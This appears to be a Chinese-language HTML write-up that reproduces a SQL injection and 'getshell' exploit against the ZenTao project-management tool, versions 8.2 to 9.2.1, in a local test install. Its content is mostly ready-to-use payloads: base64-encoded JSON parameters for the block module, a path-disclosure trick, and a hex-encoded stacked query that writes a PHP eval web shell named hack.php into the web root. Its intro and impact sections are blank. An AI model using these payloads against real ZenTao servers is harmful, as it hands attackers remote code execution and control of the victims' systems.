<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="禅道-82-921-注入getshell"><span class="csECDA2D3">禅道</span><span class="csDE05BCC"> 8.2-9.2.1 </span><span class="csECDA2D3">注入</span><span class="csDE05BCC">&amp;getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我这里用的官方集成环境版本</span><span class="cs8926E06">8.4</span></p><p class="cs3A447A38"><span class="cs7FFD2630">获取版本号：</span><span class="cs9FB05234">/index.php?mode=getconfig</span></p><p class="cs40DD2BC9"><span><img src="Web安全/禅道/%e7%a6%85%e9%81%938.2-9.2.1%20%e6%b3%a8%e5%85%a5GetShell_files/image0.jpg" width="560" height="317" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">绝对路径</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获取绝对路径：网址后面随便输入什么就会爆出绝对路径</span></p><p class="cs40DD2BC9"><span><img src="Web安全/禅道/%e7%a6%85%e9%81%938.2-9.2.1%20%e6%b3%a8%e5%85%a5GetShell_files/image1.jpg" width="560" height="317" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">没路径的报错</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">base64</span><span class="cs9C1B1871">加密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=</span></p><p class="cs40DD2BC9"><span class="cs8926E06">EXP</span></p><p class="cs3A447A38"><span class="cs7FFD2630">提交地址：</span><span class="cs9FB05234">http://127.0.0.1:81/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=base64</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">※</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">需要</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">加密后才能提交，且回显、写</span><span class="cs8926E06">Shell</span><span class="cs9C1B1871">须加上</span><span class="cs8926E06">Referer</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><a class="cs508254C" href="http://127.0.0.1:81/zentao/"><span class="cs4B51D5E4">http://127.0.0.1:81/zentao/</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注入显密码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;orderBy&quot;:&quot;order limit 1;#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">base64</span><span class="cs9C1B1871">加密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不知道什么原因，本地复现无账号密码回显。。。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/禅道/%e7%a6%85%e9%81%938.2-9.2.1%20%e6%b3%a8%e5%85%a5GetShell_files/image2.jpg" width="560" height="317" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">前台</span><span class="cs8926E06">GetShell</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中有部分使用了</span><span class="cs8926E06">MySQL</span><span class="cs9C1B1871">的预处理查询绕过程序的过滤：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">导出</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">select &#39;&lt;?php @eval($_POST[x])?&gt;&#39; into outfile &#39;D:/zentao/xampp/zentao/www/hack.php&#39;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">HEX</span><span class="cs9C1B1871">编码：（注意加密解密都不带</span><span class="cs8926E06">0x</span><span class="cs9C1B1871">，但是</span><span class="cs8926E06">EXP</span><span class="cs9C1B1871">中需要加上）</span></p><p class="cs3A447A38"><span class="cs9FB05234">73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027</span></p><p class="cs40DD2BC9"><span class="cs8926E06">base64</span><span class="cs9C1B1871">加密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问之即可在目录下生成</span><span class="cs8926E06">hack.php</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
